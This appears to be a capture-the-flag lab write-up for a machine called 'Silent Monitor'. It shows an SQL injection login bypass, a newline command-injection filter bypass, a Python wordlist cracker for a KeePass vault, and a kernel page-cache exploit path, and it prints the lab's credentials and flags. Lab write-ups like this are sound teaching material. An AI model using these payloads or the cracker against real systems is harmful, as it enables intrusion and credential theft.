# Silent Monitor - Writeup

## 1. Initial Enumeration
The target IP was `10.48.163.48`. A full nmap scan revealed two open ports:
- **Port 22 (SSH):** OpenSSH 8.9p1
- **Port 5050 (HTTP):** Werkzeug httpd 2.0.2 (Python 3.10.12)

Accessing the web portal on port 5050 showed the "CorpNet Network Operations Centre". 

## 2. Initial Access
### SQL Injection
The `/internal` page featured a login form. Testing for SQL injection revealed it was vulnerable. Using the payload `admin' OR 1=1--` in the username field allowed a successful bypass, granting a session as the user `netops` (role: `operator`).

### OS Command Injection
Once logged in, the **Host Health** page (`/internal/health`) allowed pinging internal targets. The `target` parameter was vulnerable to command injection. While standard separators like `;` and `&` were filtered, a newline character (`\n` or `%0a`) successfully bypassed the validation.

**Payload to list files:**
```bash
target=127.0.0.1%0als -la
```

Using this, I discovered a file named `secret.config` in the `/opt/netops` directory.

## 3. Credential Discovery
Reading `secret.config` revealed cleartext credentials for a backup agent:
```ini
[backup_agent]
run_as   = sysadmin
password = S3cur3Backup$Acc3ss!
```

I used these credentials to log in via SSH:
```bash
ssh sysadmin@10.48.163.48
# Password: S3cur3Backup$Acc3ss!
```
**User Flag:** `THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}`

---

## 4. Privilege Escalation (Intended Path)

### Cracking the KeePass Vault
In `/home/sysadmin/backups/`, I found a KeePass database named `infrastructure.kdbx`. Since it used the modern KDBX4 format (unsupported by the system's `keepass2john`), I wrote a custom Python script using the `pykeepass` library to perform a wordlist attack against the vault using `rockyou.txt`.

**KeePass Cracker Script (`keepass_cracker.py`):**
```python
import sys
from pykeepass import PyKeePass
from pykeepass.exceptions import CredentialsError

KDBX_FILE = 'infrastructure.kdbx'
WORDLIST = 'rockyou.txt'

def main():
    with open(WORDLIST, 'rb') as f:
        for line in f:
            password = line.strip().decode('utf-8', errors='ignore')
            try:
                kp = PyKeePass(KDBX_FILE, password=password)
                print(f"[+] SUCCESS! Password found: {password}")
                for entry in kp.entries:
                    print(f"Title: {entry.title} | Pass: {entry.password}")
                return
            except CredentialsError:
                continue
if __name__ == "__main__":
    main()
```

**Execution:**
```bash
pip install pykeepass
python3 keepass_cracker.py
```
- **Vault Password Found:** `spring`
- **Root Credentials Found Inside:** `S3cur3P4ss0nK33p4ss`

### Root Access
Using the password found in the vault:
```bash
su root
# Password: S3cur3P4ss0nK33p4ss
```
**Root Flag:** `THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}`

---

## 5. Privilege Escalation (Unintended/Alternate Path)

### CVE-2026-31431 (AF_ALG/splice Vulnerability)
During enumeration, a suspicious probe script in `/tmp` suggested the system was vulnerable to a **Page Cache Write** vulnerability in the Linux kernel (`AF_ALG` interface with `splice` system call).

This vulnerability allows a non-privileged user to write data directly into the page cache of a read-only file. By leveraging a custom exploit (`copy_fail_C.py`), I was able to patch the `/etc/passwd` file in memory to remove the root password requirements or modify the root user's shell.

**Steps:**
1. Upload the exploit script.
2. Run the script to patch `/etc/passwd` or `/bin/su` in memory.
3. Access root shell directly:
```bash
su root
# (No password required due to in-memory patch)
```

---

## Summary of Flags
- **User Flag:** `THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}`
- **Root Flag:** `THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}`
